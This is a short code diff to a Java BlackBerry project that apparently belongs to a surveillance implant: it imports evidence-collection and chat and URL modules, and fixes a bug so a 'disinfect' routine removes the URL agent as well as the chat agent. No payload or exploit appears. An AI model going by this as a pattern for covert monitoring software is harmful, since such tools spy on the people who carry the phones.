@@ -22,13 +22,14 @@ import blackberry.Task;
 import blackberry.Trigger;
 import blackberry.config.ConfAction;
 import blackberry.config.ConfigurationException;
+import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceCollector;
 import blackberry.fs.AutoFile;
 import blackberry.module.ModuleChat;
-import blackberry.debug.Check;
+import blackberry.module.ModuleUrl;
 import blackberry.utils.Utils;
 
 /**
@@ -123,7 +124,7 @@ public final class ExecuteAction extends SubActionMain {
         // forget ImAgent
         ((ModuleChat) ModuleChat.getInstance()).disinfect();
         // forget UrlAgent
-        ((ModuleChat) ModuleChat.getInstance()).disinfect();
+        ((ModuleUrl) ModuleUrl.getInstance()).disinfect();
     }
 
     //#endif
